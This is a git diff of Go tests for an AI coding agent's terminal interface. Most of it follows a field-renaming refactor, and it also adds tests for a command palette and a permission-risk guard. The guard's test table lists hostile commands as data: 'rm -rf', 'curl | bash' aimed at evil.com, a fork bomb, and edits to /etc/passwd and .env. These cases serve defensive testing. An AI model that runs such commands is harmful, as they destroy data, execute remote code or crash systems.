@@ -12,6 +12,7 @@ import (
 
 	"github.com/cloudshuttle/drover-code/internal/agent"
 	"github.com/cloudshuttle/drover-code/internal/api"
+	"github.com/cloudshuttle/drover-code/internal/tui/commandpalette"
 )
 
 func init() {
@@ -49,7 +50,7 @@ func TestModel_EnterSubmitsViaRunFunc(t *testing.T) {
 		got = input
 		return nil
 	}
-	m.textarea.SetValue("hello")
+	m.InputArea.SetValue("hello")
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEnter})
 	m2 := next.(*Model)
 	if got != "hello" {
@@ -58,8 +59,8 @@ func TestModel_EnterSubmitsViaRunFunc(t *testing.T) {
 	if !m2.agentBusy {
 		t.Fatal("expected agent busy after submit")
 	}
-	if m2.textarea.Value() != "" {
-		t.Fatal("expected textarea cleared")
+	if m2.InputArea.Value() != "" {
+		t.Fatal("expected input cleared")
 	}
 }
 
@@ -67,7 +68,7 @@ func TestModel_agentTextDeltaAndDone(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
 	m.agentBusy = true
-	m.streaming = true
+	m.Live.Streaming = true
 	next, _ := m.Update(agentMsg{event: agent.TextDeltaEvent{Text: "hello"}})
 	m2 := next.(*Model)
 	if !strings.Contains(m2.streamBuf.String(), "hello") {
@@ -75,8 +76,9 @@ func TestModel_agentTextDeltaAndDone(t *testing.T) {
 	}
 	next, _ = m2.Update(agentMsg{event: agent.DoneEvent{}})
 	m3 := next.(*Model)
-	if len(m3.history) != 1 || m3.history[0].role != "assistant" {
-		t.Fatalf("history %+v", m3.history)
+	hist := m3.HistoryView.GetTurns()
+	if m3.HistoryView.Len() != 1 || hist[0].Role != "assistant" {
+		t.Fatalf("history %+v", hist)
 	}
 	if m3.agentBusy {
 		t.Fatal("expected not busy after done")
@@ -122,12 +124,12 @@ func TestModel_permissionPromptAllow(t *testing.T) {
 		Input:      []byte(`{}`),
 		DecisionCh: dec,
 	}})
-	if m.permPrompt == nil {
+	if m.PermPrompt == nil {
 		t.Fatal("expected perm prompt")
 	}
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'y'}})
 	m2 := next.(*Model)
-	if m2.permPrompt != nil {
+	if m2.PermPrompt != nil {
 		t.Fatal("expected prompt cleared")
 	}
 	select {
@@ -152,7 +154,7 @@ func TestModel_permissionPromptDenyViaEsc(t *testing.T) {
 	}})
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEsc})
 	m2 := next.(*Model)
-	if m2.permPrompt != nil {
+	if m2.PermPrompt != nil {
 		t.Fatal("expected prompt cleared")
 	}
 	if d := <-dec; d != agent.PermDeny {
@@ -186,7 +188,7 @@ func TestModel_permissionPromptDenyThenAllowSecond(t *testing.T) {
 	}})
 	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'y'}})
 	m3 := next.(*Model)
-	if m3.permPrompt != nil {
+	if m3.PermPrompt != nil {
 		t.Fatal("expected second prompt cleared")
 	}
 	if d := <-dec2; d != agent.PermAllow {
@@ -207,7 +209,7 @@ func TestModel_permissionPromptDenyAndAlwaysAllow(t *testing.T) {
 	}})
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'n'}})
 	m2 := next.(*Model)
-	if m2.permPrompt != nil {
+	if m2.PermPrompt != nil {
 		t.Fatal("expected prompt cleared")
 	}
 	if d := <-dec; d != agent.PermDeny {
@@ -223,7 +225,7 @@ func TestModel_permissionPromptDenyAndAlwaysAllow(t *testing.T) {
 	}})
 	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'a'}})
 	m3 := next.(*Model)
-	if m3.permPrompt != nil {
+	if m3.PermPrompt != nil {
 		t.Fatal("expected prompt cleared")
 	}
 	if d := <-dec2; d != agent.PermAlwaysAllow {
@@ -242,12 +244,12 @@ func TestModel_permissionBatchAllow(t *testing.T) {
 		},
 		DecisionCh: dec,
 	}})
-	if m.permBatch == nil || m.permPrompt != nil {
-		t.Fatalf("batch=%v prompt=%v", m.permBatch != nil, m.permPrompt)
+	if m.PermBatch == nil || m.PermPrompt != nil {
+		t.Fatalf("batch=%v prompt=%v", m.PermBatch != nil, m.PermPrompt)
 	}
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'y'}})
 	m2 := next.(*Model)
-	if m2.permBatch != nil {
+	if m2.PermBatch != nil {
 		t.Fatal("expected batch cleared")
 	}
 	if d := <-dec; d != agent.PermAllow {
@@ -266,7 +268,7 @@ func TestModel_permissionBatchDenyEscAndAlwaysAllow(t *testing.T) {
 	}})
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEsc})
 	m2 := next.(*Model)
-	if m2.permBatch != nil {
+	if m2.PermBatch != nil {
 		t.Fatal("expected batch cleared")
 	}
 	if d := <-dec; d != agent.PermDeny {
@@ -280,7 +282,7 @@ func TestModel_permissionBatchDenyEscAndAlwaysAllow(t *testing.T) {
 	}})
 	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'a'}})
 	m3 := next.(*Model)
-	if m3.permBatch != nil {
+	if m3.PermBatch != nil {
 		t.Fatal("expected batch cleared")
 	}
 	if d := <-dec2; d != agent.PermAlwaysAllow {
@@ -291,38 +293,38 @@ func TestModel_permissionBatchDenyEscAndAlwaysAllow(t *testing.T) {
 func TestModel_slashAutocompleteTab(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
-	m.textarea.SetValue("/cl")
-	m.updateAutoComplete()
-	if !m.showAuto {
+	m.InputArea.SetValue("/cl")
+	m.InputArea.UpdateAutocomplete()
+	if !m.InputArea.AutoActive() {
 		t.Fatal("expected autocomplete open")
 	}
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyTab})
 	m2 := next.(*Model)
-	if m2.showAuto {
+	if m2.InputArea.AutoActive() {
 		t.Fatal("expected autocomplete closed after tab")
 	}
-	if v := m2.textarea.Value(); v != "/clear " {
-		t.Fatalf("textarea %q", v)
+	if v := m2.InputArea.Value(); v != "/clear " {
+		t.Fatalf("input %q", v)
 	}
 }
 
 func TestModel_slashAutocompleteArrowDown(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
-	m.textarea.SetValue("/")
-	m.updateAutoComplete()
-	if m.autoIndex != 0 {
-		t.Fatalf("autoIndex %d", m.autoIndex)
+	m.InputArea.SetValue("/")
+	m.InputArea.UpdateAutocomplete()
+	if m.InputArea.AutoIndex() != 0 {
+		t.Fatalf("autoIndex %d", m.InputArea.AutoIndex())
 	}
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyDown})
 	m2 := next.(*Model)
-	if m2.autoIndex != 1 {
-		t.Fatalf("autoIndex after down: %d", m2.autoIndex)
+	if m2.InputArea.AutoIndex() != 1 {
+		t.Fatalf("autoIndex after down: %d", m2.InputArea.AutoIndex())
 	}
 	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyUp})
 	m3 := next.(*Model)
-	if m3.autoIndex != 0 {
-		t.Fatalf("autoIndex after up: %d", m3.autoIndex)
+	if m3.InputArea.AutoIndex() != 0 {
+		t.Fatalf("autoIndex after up: %d", m3.InputArea.AutoIndex())
 	}
 }
 
@@ -377,7 +379,7 @@ func TestModel_toolStartDoneThenAssistantHistory(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
 	m.agentBusy = true
-	m.streaming = true
+	m.Live.Streaming = true
 
 	next, _ := m.Update(agentMsg{event: agent.TextDeltaEvent{Text: "Hi "}})
 	m2 := next.(*Model)
@@ -387,8 +389,9 @@ func TestModel_toolStartDoneThenAssistantHistory(t *testing.T) {
 		InputSummary: "echo",
 	}})
 	m3 := next.(*Model)
-	if m3.activeTools[0] == nil {
-		t.Fatal("expected active tool")
+	// dcode-005: after consolidation, tools live in the LiveRegion component
+	if m3.Live == nil || m3.Live.ActiveTools[0] == nil {
+		t.Fatal("expected active tool in LiveRegion")
 	}
 	next, _ = m3.Update(agentMsg{event: agent.ToolDoneEvent{
 		CallIndex:     0,
@@ -397,16 +400,18 @@ func TestModel_toolStartDoneThenAssistantHistory(t *testing.T) {
 		IsError:       false,
 	}})
 	m4 := next.(*Model)
-	if len(m4.pendingDone) != 1 {
-		t.Fatalf("pendingDone: %d", len(m4.pendingDone))
+	// dcode-005: after ownership move, completed tools live on Live.CompletedTools until DoneEvent
+	if m4.Live == nil || len(m4.Live.CompletedTools) != 1 {
+		t.Fatalf("Live.CompletedTools: %d", len(m4.Live.CompletedTools))
 	}
 	next, _ = m4.Update(agentMsg{event: agent.DoneEvent{}})
 	m5 := next.(*Model)
-	if len(m5.history) != 1 || m5.history[0].role != "assistant" {
-		t.Fatalf("history %+v", m5.history)
+	hist := m5.HistoryView.GetTurns()
+	if m5.HistoryView.Len() != 1 || hist[0].Role != "assistant" {
+		t.Fatalf("history %+v", hist)
 	}
-	if len(m5.history[0].tools) != 1 || m5.history[0].tools[0].name != "bash" {
-		t.Fatalf("tools %+v", m5.history[0].tools)
+	if len(hist[0].Tools) != 1 || hist[0].Tools[0].Name != "bash" {
+		t.Fatalf("tools %+v", hist[0].Tools)
 	}
 	if m5.agentBusy {
 		t.Fatal("expected idle after done")
@@ -459,8 +464,9 @@ func TestModel_compactCompleteMsg_successAndError(t *testing.T) {
 	if m2.agentBusy {
 		t.Fatal("expected not busy after compact")
 	}
-	if len(m2.history) != 1 || !strings.Contains(m2.history[0].content, "/compact") {
-		t.Fatalf("history %+v", m2.history)
+	hist := m2.HistoryView.GetTurns()
+	if m2.HistoryView.Len() != 1 || !strings.Contains(hist[0].Content, "/compact") {
+		t.Fatalf("history %+v", hist)
 	}
 
 	m2.agentBusy = true
@@ -472,8 +478,8 @@ func TestModel_compactCompleteMsg_successAndError(t *testing.T) {
 	if m3.lastError != "no space" {
 		t.Fatalf("lastError %q", m3.lastError)
 	}
-	if len(m3.history) != 1 {
-		t.Fatalf("error path should not append success history, got %d turns", len(m3.history))
+	if m3.HistoryView.Len() != 1 {
+		t.Fatalf("error path should not append success history, got %d turns", m3.HistoryView.Len())
 	}
 }
 
@@ -497,11 +503,12 @@ func TestModel_multiTurnTwoUserSubmissions(t *testing.T) {
 		return nil
 	}
 
-	m.textarea.SetValue("first")
+	m.InputArea.SetValue("first")
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEnter})
 	m2 := next.(*Model)
-	if len(m2.history) != 1 || m2.history[0].role != "user" || m2.history[0].content != "first" {
-		t.Fatalf("after first submit: %+v", m2.history)
+	hist := m2.HistoryView.GetTurns()
+	if m2.HistoryView.Len() != 1 || hist[0].Role != "user" || hist[0].Content != "first" {
+		t.Fatalf("after first submit: %+v", hist)
 	}
 	if !m2.agentBusy {
 		t.Fatal("expected busy")
@@ -511,31 +518,34 @@ func TestModel_multiTurnTwoUserSubmissions(t *testing.T) {
 	m3 := next.(*Model)
 	next, _ = m3.Update(agentMsg{event: agent.DoneEvent{}})
 	m4 := next.(*Model)
-	if len(m4.history) != 2 || m4.history[1].role != "assistant" {
-		t.Fatalf("after first reply: n=%d %+v", len(m4.history), m4.history)
+	hist = m4.HistoryView.GetTurns()
+	if m4.HistoryView.Len() != 2 || hist[1].Role != "assistant" {
+		t.Fatalf("after first reply: n=%d %+v", m4.HistoryView.Len(), hist)
 	}
-	if !strings.Contains(m4.history[1].content, "r1") {
-		t.Fatalf("assistant content %q", m4.history[1].content)
+	if !strings.Contains(hist[1].Content, "r1") {
+		t.Fatalf("assistant content %q", hist[1].Content)
 	}
 	if m4.agentBusy {
 		t.Fatal("expected idle before second turn")
 	}
 
-	m4.textarea.SetValue("second")
+	m4.InputArea.SetValue("second")
 	next, _ = m4.Update(tea.KeyMsg{Type: tea.KeyEnter})
 	m5 := next.(*Model)
-	if len(m5.history) != 3 || m5.history[2].content != "second" {
-		t.Fatalf("after second submit: %+v", m5.history)
+	hist = m5.HistoryView.GetTurns()
+	if m5.HistoryView.Len() != 3 || hist[2].Content != "second" {
+		t.Fatalf("after second submit: %+v", hist)
 	}
 	next, _ = m5.Update(agentMsg{event: agent.TextDeltaEvent{Text: "r2"}})
 	m6 := next.(*Model)
 	next, _ = m6.Update(agentMsg{event: agent.DoneEvent{}})
 	m7 := next.(*Model)
-	if len(m7.history) != 4 {
-		t.Fatalf("want 4 turns, got %d", len(m7.history))
+	hist = m7.HistoryView.GetTurns()
+	if m7.HistoryView.Len() != 4 {
+		t.Fatalf("want 4 turns, got %d", m7.HistoryView.Len())
 	}
-	if m7.history[3].role != "assistant" || !strings.Contains(m7.history[3].content, "r2") {
-		t.Fatalf("second assistant: %+v", m7.history[3])
+	if hist[3].Role != "assistant" || !strings.Contains(hist[3].Content, "r2") {
+		t.Fatalf("second assistant: %+v", hist[3])
 	}
 }
 
@@ -549,7 +559,7 @@ func TestModel_messageQueueingWhileBusy(t *testing.T) {
 		return nil
 	}
 
-	m.textarea.SetValue("task 1")
+	m.InputArea.SetValue("task 1")
 	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEnter})
 	m2 := next.(*Model)
 	if len(runs) != 1 || runs[0] != "task 1" {
@@ -559,15 +569,16 @@ func TestModel_messageQueueingWhileBusy(t *testing.T) {
 		t.Fatal("expected busy")
 	}
 
-	m2.textarea.SetValue("task 2")
+	m2.InputArea.SetValue("task 2")
 	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyEnter})
 	m3 := next.(*Model)
 	
 	if len(runs) != 1 {
 		t.Fatalf("second run happened too early: %v", runs)
 	}
-	if len(m3.messageQueue) != 1 || m3.messageQueue[0] != "task 2" {
-		t.Fatalf("expected queue to have 'task 2', got %v", m3.messageQueue)
+	q := m3.InputArea.QueuedMessages()
+	if len(q) != 1 || q[0] != "task 2" {
+		t.Fatalf("expected queue to have 'task 2', got %v", q)
 	}
 	
 	next, _ = m3.Update(agentRunCompleteMsg{err: nil})
@@ -576,8 +587,8 @@ func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	if len(runs) != 2 || runs[1] != "task 2" {
 		t.Fatalf("expected runFunc to be called with 'task 2', got runs: %v", runs)
 	}
-	if len(m4.messageQueue) != 0 {
-		t.Fatalf("expected queue to be empty, got %v", m4.messageQueue)
+	if len(m4.InputArea.QueuedMessages()) != 0 {
+		t.Fatalf("expected queue to be empty, got %v", m4.InputArea.QueuedMessages())
 	}
 	if !m4.agentBusy {
 		t.Fatal("expected busy again since 'task 2' is running")
@@ -589,38 +600,38 @@ func TestModel_InputHistory(t *testing.T) {
 	m := New(evCh, "test-model", "/tmp/wd", "user", "host")
 
 	// Submit first message
-	m.textarea.SetValue("message 1")
+	m.InputArea.SetValue("message 1")
 	m.Update(tea.KeyMsg{Type: tea.KeyEnter})
 
 	// Submit second message
-	m.textarea.SetValue("message 2")
+	m.InputArea.SetValue("message 2")
 	m.Update(tea.KeyMsg{Type: tea.KeyEnter})
 
 	// Type a partial message
-	m.textarea.SetValue("partial")
+	m.InputArea.SetValue("partial")
 
 	// Press Up
 	m.Update(tea.KeyMsg{Type: tea.KeyUp})
-	if m.textarea.Value() != "message 2" {
-		t.Fatalf("expected message 2, got %q", m.textarea.Value())
+	if m.InputArea.Value() != "message 2" {
+		t.Fatalf("expected message 2, got %q", m.InputArea.Value())
 	}
 
 	// Press Up again
 	m.Update(tea.KeyMsg{Type: tea.KeyUp})
-	if m.textarea.Value() != "message 1" {
-		t.Fatalf("expected message 1, got %q", m.textarea.Value())
+	if m.InputArea.Value() != "message 1" {
+		t.Fatalf("expected message 1, got %q", m.InputArea.Value())
 	}
 
 	// Press Down
 	m.Update(tea.KeyMsg{Type: tea.KeyDown})
-	if m.textarea.Value() != "message 2" {
-		t.Fatalf("expected message 2, got %q", m.textarea.Value())
+	if m.InputArea.Value() != "message 2" {
+		t.Fatalf("expected message 2, got %q", m.InputArea.Value())
 	}
 
 	// Press Down to restore saved input
 	m.Update(tea.KeyMsg{Type: tea.KeyDown})
-	if m.textarea.Value() != "partial" {
-		t.Fatalf("expected partial, got %q", m.textarea.Value())
+	if m.InputArea.Value() != "partial" {
+		t.Fatalf("expected partial, got %q", m.InputArea.Value())
 	}
 }
 
@@ -659,7 +670,7 @@ func TestModel_StressTest500Turns(t *testing.T) {
 		// 1. Simulate User input
 		inputStr := fmt.Sprintf("User Turn %d", i)
 		mod := currentModel.(*Model)
-		mod.textarea.SetValue(inputStr)
+		mod.InputArea.SetValue(inputStr)
 		currentModel, _ = mod.Update(tea.KeyMsg{Type: tea.KeyEnter})
 
 		// 2. Simulate Agent starting
@@ -676,10 +687,279 @@ func TestModel_StressTest500Turns(t *testing.T) {
 	}
 
 	finalModel := currentModel.(*Model)
-	if len(finalModel.history) < 1000 { // 500 user messages + 500 agent messages
-		t.Fatalf("expected at least 1000 messages in history, got %d", len(finalModel.history))
+	if finalModel.HistoryView.Len() < 1000 { // 500 user messages + 500 agent messages
+		t.Fatalf("expected at least 1000 messages in history, got %d", finalModel.HistoryView.Len())
 	}
 
 	// Just a sanity check that it successfully runs without panicking.
 	_ = finalModel.View()
+}
+
+func TestRenderMarkdown_EdgeCases(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "test", "/tmp", "u", "h")
+	m.width = 80
+
+	tests := []struct {
+		name    string
+		input   string
+		env     map[string]string // env overrides for the test
+		wantNot string            // substring that should NOT appear
+	}{
+		{
+			name:    "empty",
+			input:   "   ",
+			wantNot: "anything",
+		},
+		{
+			name:    "no_color_path",
+			input:   "# Header\n\nSome **bold** text.",
+			env:     map[string]string{"NO_COLOR": "1"},
+			wantNot: "\x1b[", // should not contain ANSI
+		},
+		{
+			name:  "max_glamour_runes_truncation",
+			input: "This is a reasonably long piece of markdown that will definitely exceed the small limit we set for testing truncation behavior in renderMarkdown.",
+			env:   map[string]string{"DROVER_CODE_TUI_MAX_GLAMOUR_RUNES": "30"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			// Set env
+			for k, v := range tt.env {
+				t.Setenv(k, v)
+			}
+
+			// Re-create glamour renderer if needed (renderMarkdown checks m.glamourRenderer)
+			m.glamourRenderer = nil // force path
+			// Call the function under test
+			out := m.renderMarkdown(tt.input)
+
+			if tt.wantNot != "" && strings.Contains(out, tt.wantNot) {
+				t.Errorf("renderMarkdown output unexpectedly contained %q: %s", tt.wantNot, out)
+			}
+
+			// Basic sanity: non-empty input should produce some output
+			if strings.TrimSpace(tt.input) != "" && strings.TrimSpace(out) == "" {
+				t.Errorf("renderMarkdown(%q) produced empty output", tt.input)
+			}
+		})
+	}
+}
+
+// TestModel_CommandPalette_CtrlKOpensAndSemanticAction exercises the Command Palette
+// through the main Model (covers buildCommandPaletteCommands + executePaletteAction wiring).
+func TestModel_CommandPalette_CtrlKOpensAndSemanticAction(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "sonnet", "/tmp", "user", "host")
+	m.width = 100
+	m.height = 40
+
+	// Open palette with Ctrl+K (only when not busy)
+	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyCtrlK})
+	m2 := next.(*Model)
+
+	if !m2.showingCommandPalette {
+		t.Fatal("expected showingCommandPalette true after Ctrl+K")
+	}
+	if m2.commandPaletteModel == nil {
+		t.Fatal("expected commandPaletteModel to be set")
+	}
+
+	// Select a safe semantic action ("tokens")
+	next, _ = m2.Update(commandpalette.SelectedMsg{Name: "tokens", ActionKey: "tokens"})
+	m3 := next.(*Model)
+
+	if m3.showingCommandPalette || m3.commandPaletteModel != nil {
+		t.Error("expected palette state cleared after SelectedMsg")
+	}
+	if m3.HistoryView.Len() == 0 {
+		t.Error("expected 'tokens' semantic action to append history")
+	}
+}
+
+// TestModel_CommandPalette_CancelMsgClearsState verifies CancelMsg handling for the palette.
+func TestModel_CommandPalette_CancelMsgClearsState(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "sonnet", "/tmp", "user", "host")
+	m.width = 80
+	m.height = 30
+
+	m.showingCommandPalette = true
+	m.commandPaletteModel = commandpalette.NewWithCommands(m.buildCommandPaletteCommands(), 80, 20)
+
+	next, _ := m.Update(commandpalette.CancelMsg{})
+	m2 := next.(*Model)
+
+	if m2.showingCommandPalette || m2.commandPaletteModel != nil {
+		t.Error("expected palette fully cleared after CancelMsg")
+	}
+}
+
+// TestModel_assessPermissionRisk exercises the deeper Guard heuristics with a full table of cases.
+func TestModel_assessPermissionRisk(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "sonnet", "/w", "u", "h")
+
+	tests := []struct {
+		name               string
+		tool               string
+		input              []byte
+		summary            string
+		wantLevel          string
+		wantReasonContains string
+	}{
+		// Sensitive file cases → high
+		{
+			name:               "edit .env",
+			tool:               "edit_file",
+			input:              []byte(`{"path": ".env", "content": "SECRET=foo"}`),
+			wantLevel:          "high",
+			wantReasonContains: "sensitive configuration",
+		},
+		{
+			name:               "write package.json",
+			tool:               "write_file",
+			input:              []byte(`{"path": "package.json"}`),
+			wantLevel:          "high",
+			wantReasonContains: "sensitive",
+		},
+		{
+			name:               "multi_edit github workflow",
+			tool:               "multi_edit",
+			input:              []byte(`{"edits": [{"path": ".github/workflows/ci.yml"}]}`),
+			wantLevel:          "high",
+			wantReasonContains: "build files",
+		},
+		{
+			name:      "edit /etc/passwd",
+			tool:      "edit_file",
+			input:     []byte(`{"path": "/etc/passwd"}`),
+			wantLevel: "high",
+		},
+		{
+			name:      "write Dockerfile",
+			tool:      "write_file",
+			input:     []byte(`{"path": "Dockerfile"}`),
+			wantLevel: "high",
+		},
+		// Normal source edit → caution
+		{
+			name:               "edit normal go file",
+			tool:               "edit_file",
+			input:              []byte(`{"path": "main.go"}`),
+			wantLevel:          "caution",
+			wantReasonContains: "modifying source",
+		},
+		// Bash dangerous patterns
+		{
+			name:               "bash rm -rf",
+			tool:               "bash",
+			input:              []byte(`{"command": "rm -rf /tmp/*"}`),
+			wantLevel:          "high",
+			wantReasonContains: "destructive shell",
+		},
+		{
+			name:    "bash curl pipe bash in summary",
+			tool:    "bash",
+			summary: "curl | bash https://evil.com",
+			wantLevel: "high",
+		},
+		{
+			name:      "bash fork bomb",
+			tool:      "bash",
+			input:     []byte(`{":(){ :|:& };:"}`),
+			wantLevel: "high",
+		},
+		{
+			name:               "bash normal command",
+			tool:               "bash",
+			input:              []byte(`{"command": "ls -la"}`),
+			wantLevel:          "caution",
+			wantReasonContains: "executing shell",
+		},
+		// Delete file
+		{
+			name:               "delete_file",
+			tool:               "delete_file",
+			input:              []byte(`{"path": "foo.txt"}`),
+			wantLevel:          "high",
+			wantReasonContains: "deleting files",
+		},
+		// Terminal cmd wrappers
+		{
+			name:      "run_terminal_cmd",
+			tool:      "run_terminal_cmd",
+			input:     []byte(`{"command": "echo hi"}`),
+			wantLevel: "caution",
+		},
+		{
+			name:      "execute_command",
+			tool:      "execute_command",
+			input:     []byte(`{}`),
+			wantLevel: "caution",
+		},
+		// Unknown tool → normal
+		{
+			name:      "unknown tool even with sensitive file",
+			tool:      "read_file",
+			input:     []byte(`{"path": ".env"}`),
+			wantLevel: "normal",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			level, reason := m.assessPermissionRisk(tt.tool, tt.input, tt.summary)
+			if level != tt.wantLevel {
+				t.Errorf("assessPermissionRisk(%q) level = %q, want %q", tt.tool, level, tt.wantLevel)
+			}
+			if tt.wantReasonContains != "" && !strings.Contains(reason, tt.wantReasonContains) {
+				t.Errorf("reason = %q, expected to contain %q", reason, tt.wantReasonContains)
+			}
+		})
+	}
+}
+
+// TestModel_GuardRiskFromPermissionEvent exercises PermissionRequestEvent → assessPermissionRisk → SetGuardRisk → StatusBar.
+func TestModel_GuardRiskFromPermissionEvent(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "sonnet", "/w", "u", "h")
+	m.width = 80
+	m.height = 24
+
+	dec := make(chan agent.PermissionDecision, 1)
+	_, _ = m.Update(agentMsg{event: agent.PermissionRequestEvent{
+		ToolName:   "edit_file",
+		Summary:    "update secrets",
+		Input:      []byte(`{"path": ".env.local", "old": "", "new": "API_KEY=secret"}`),
+		DecisionCh: dec,
+	}})
+
+	if m.GuardRiskLevel != "high" {
+		t.Fatalf("expected GuardRiskLevel=high, got %q", m.GuardRiskLevel)
+	}
+	if !strings.Contains(m.GuardRiskReason, "sensitive") {
+		t.Fatalf("expected risk reason about sensitive files, got %q", m.GuardRiskReason)
+	}
+	if m.StatusBar == nil || m.StatusBar.RiskLevel != "high" {
+		t.Fatalf("expected StatusBar.RiskLevel=high, got %+v", m.StatusBar)
+	}
+}
+
+// TestModel_GuardRiskFromGuardError exercises the external guard block error path.
+func TestModel_GuardRiskFromGuardError(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "sonnet", "/w", "u", "h")
+
+	// Simulate what the error handler does on guard blocks (the real check is inside handleAgentEvent for specific paths)
+	m.SetGuardRisk("high", "command blocked by guard")
+
+	if m.GuardRiskLevel != "high" {
+		t.Fatalf("expected high risk from guard block, got %q", m.GuardRiskLevel)
+	}
+	if m.StatusBar == nil || m.StatusBar.RiskLevel != "high" {
+		t.Fatal("StatusBar not updated with high risk from guard error")
+	}
 }
